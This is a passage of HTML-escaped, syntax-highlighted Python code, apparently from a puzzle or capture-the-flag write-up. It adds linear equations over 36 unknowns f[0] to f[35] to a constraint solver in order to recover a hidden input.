style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;3&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; f[&lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;20&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; f[&lt;span style=&#34;color:#ae81ff&#34;&gt;3&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;61&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; f[&lt;span style=&#34;color:#ae81ff&#34;&gt;17&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;56&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; f[&lt;span style=&#34;color:#ae81ff&#34;&gt;15&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;97&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; f[&lt;span style=&#34;color:#ae81ff&#34;&gt;22&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;96&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; f[&lt;span style=&#34;color:#ae81ff&#34;&gt;9&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;61&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; f[&lt;span style=&#34;color:#ae81ff&#34;&gt;12&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;==&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;27809&lt;/span&gt;)
s&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;add(&lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;74&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; f[&lt;span style=&#34;color:#ae81ff&#34;&gt;28&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;76&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; f[&lt;span style=&#34;color:#ae81ff&#34;&gt;33&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;91&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; f[&lt;span style=&#34;color:#ae81ff&#34;&gt;5&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;83&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; f[&lt;span style=&#34;color:#ae81ff&#34;&gt;19&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;99&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; f[&lt;span style=&#34;color:#ae81ff&#34;&gt;32&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;98&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; f[&lt;span style=&#34;color:#ae81ff&#34;&gt;7&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;22&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; f[&lt;span style=&#34;color:#ae81ff&#34;&gt;34&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;83&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; f[&lt;span style=&#34;color:#ae81ff&#34;&gt;13&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;13&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; f[&lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;66&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; f[&lt;span style=&#34;color:#ae81ff&#34;&gt;11&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;25&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; f[&lt;span style=&#34;color:#ae81ff&#34;&gt;2&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;9&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; f[&lt;span style=&#34;color:#ae81ff&#34;&gt;31&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;35&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; f[&lt;span style=&#34;color:#ae81ff&#34;&gt;25&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;31&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; f[&lt;span style=&#34;color:#ae81ff&#34;&gt;18&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;95&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; f[&lt;span style=&#34;color:#ae81ff&#34;&gt;21&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;37&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; f[&lt;span style=&#34;color:#ae81ff&#34;&gt;22&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;74&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; f[&lt;span style=&#34;color:#ae81ff&#34;&gt;16&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;17&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; f[&lt;span style=&#34;color:#ae81ff&#34;&gt;12&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;27&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; f[&lt;span style=&#34;color:#ae81ff&#34;&gt;24&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;11&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; f[&lt;span style=&#34;color:#ae81ff&#34;&gt;3&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;83&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; f[&lt;span style=&#34;color:#ae81ff&#34;&gt;9&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;44&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; f[&lt;span style=&#34;color:#ae81ff&#34;&gt;35&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;26&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; f[&lt;span style=&#34;color:#ae81ff&#34;&gt;30&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;36&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; f[&lt;span style=&#34;color:#ae81ff&#34;&gt;4&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;64&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; f[&lt;span style=&#34;color:#ae81ff&#34;&gt;6&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;65&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; f[&lt;span style=&#34;color:#ae81ff&#34;&gt;26&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;46&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; f[&lt;span style=&#34;color:#ae81ff&#34;&gt;8&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;33&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; f[&lt;span style=&#34;color:#ae81ff&#34;&gt;14&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;45&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; f[&lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;32&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; f[&lt;span style=&#34;color:#ae81ff&#34;&gt;23&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;60&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; f[&lt;span style=&#34;color:#ae81ff&#34;&gt;27&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;77&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; f[&lt;span style=&#34;color:#ae81ff&#34;&gt;20&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;96&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; f[&lt;span style=&#34;color:#ae81ff&#34;&gt;15&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;23&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; f[&lt;span style=&#34;color:#ae81ff&#34;&gt;10&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;5&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; f[&lt;span style=&#34;color:#ae81ff&#34;&gt;29&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;73&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; f[&lt;span style=&#34;color:#ae81ff&#34;&gt;17&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;==&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;9604&lt;/span&gt;)
s&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;add(&lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;57&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; f[&lt;span style=&#34;color:#ae81ff&#34;&gt;31&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;32&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; f[&lt;span style=&#34;color:#ae81ff&#34;&gt;25&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;55&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; f[&lt;span style=&#34;color:#ae81ff&#34;&gt;16&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;42&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; f[&lt;span style=&#34;color:#ae81ff&#34;&gt;24&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;93&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; f[&lt;span style=&#34;color:#ae81ff&#34;&gt;26&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;69&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; f[&lt;span style=&#34;color:#ae81ff&#34;&gt;17&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;84&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; f[&lt;span style=&#34;color:#ae81ff&#34;&gt;12&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;9&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; f[&lt;span style=&#34;color:#ae81ff&#34;&gt;23&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;34&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; f[&lt;span style=&#34;color:#ae81ff&#34;&gt;32&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;84&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; f[&lt;span style=&#34;color:#ae81ff&#34;&gt;2&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;18&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; f[&lt;span style=&#34;color:#ae81ff&#34;&gt;7&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;60&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; f[&lt;span style=&#34;color:#ae81ff&#34;&gt;29&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;99&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; f[&lt;span style=&#34;color:#ae81ff&#34;&gt;30&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt; f[&lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;24&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; f[&lt;span style=&#34;color:#ae81ff&#34;&gt;21&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;36&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; f[&lt;span style=&#34;color:#ae81ff&#34;&gt;4&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;9&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; f[&lt;span style=&#34;color:#ae81ff&#34;&gt;35&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;89&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; f[&lt;span style=&#34;color:#ae81ff&#34;&gt;15&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;72&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; f[&lt;span style=&#34;color:#ae81ff&#34;&gt;19&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;86&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; f[&lt;span style=&#34;color:#ae81ff&#34;&gt;13&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;8&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; f[&lt;span style=&#34;color:#ae81ff&#34;&gt;28&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;79&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; f[&lt;span style=&#34;color:#ae81ff&#34;&gt;10&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;82&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; f[&lt;span style=&#34;color:#ae81ff&#34;&gt;8&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;88&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; f[&lt;span style=&#34;color:#ae81ff&#34;&gt;3&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;26&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; f[&lt;span style=&#34;color:#ae81ff&#34;&gt;11&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;76&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; f[&lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;69&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; f[&lt;span style=&#34;color:#ae81ff&#34;&gt;27&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;51&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; f[&lt;span style=&#34;color:#ae81ff&#34;&gt;14&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;78&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; f[&lt;span style=&#34;color:#ae81ff&#34;&gt;33&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;11&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; f[&lt;span style=&#34;color:#ae81ff&#34;&gt;18&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;83&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; f[&lt;span style=&#34;color:#ae81ff&#34;&gt;5&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;70&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; f[&lt;span style=&#34;color:#ae81ff&#34;&gt;20&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;36&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; f[&lt;span style=&#34;color:#ae81ff&#34;&gt;22&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;64&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; f[&lt;span style=&#34;color:#ae81ff&#34;&gt;6&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;19&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; f[&lt;span style=&#34;color:#ae81ff&#34;&gt;9&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;71&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; f[&lt;span style=&#34;color:#ae81ff&#34;&gt;34&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;==&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;25498&lt;/span&gt;)
s&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;add(&lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;80&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; f[&lt;span style=&#34;color:#ae81ff&#34;&gt;15&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;54&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; f[&lt;span style=&#34;color:#ae81ff&#34;&gt;2&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;75&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; f[&lt;span style=&#34;color:#ae81ff&#34;&gt;6&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;31&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; f[&lt;span style=&#34;color:#ae81ff&#34;&gt;17&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;29&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; f[&lt;span style=&#34;color:#ae81ff&#34;&gt;12&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;28&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; f[&lt;span style=&#34;color:#ae81ff&#34;&gt;28&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;57&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; f[&lt;span style=&#34;color:#ae81ff&#34;&gt;14&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;68&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; f[&lt;span style=&#34;color:#ae81ff&#34;&gt;4&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;86&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; f[&lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;82&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; f[&lt;span style=&#34;color:#ae81ff&#34;&gt;13&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;20&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; f[&lt;span style=&#34;color:#ae81ff&#34;&gt;11&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt;&lt;span 